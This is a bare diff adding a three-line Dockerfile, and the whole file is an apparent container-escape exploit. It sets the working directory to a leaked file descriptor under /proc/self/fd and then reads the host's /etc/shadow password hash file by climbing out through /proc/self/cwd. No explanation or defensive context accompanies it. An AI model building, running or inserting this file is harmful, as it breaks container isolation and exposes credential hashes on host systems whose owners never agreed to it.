@@ -1,0 +1,3 @@
+FROM alpine:3.20
+WORKDIR /proc/self/fd/8
+RUN cat /proc/self/cwd/../../../etc/shadow
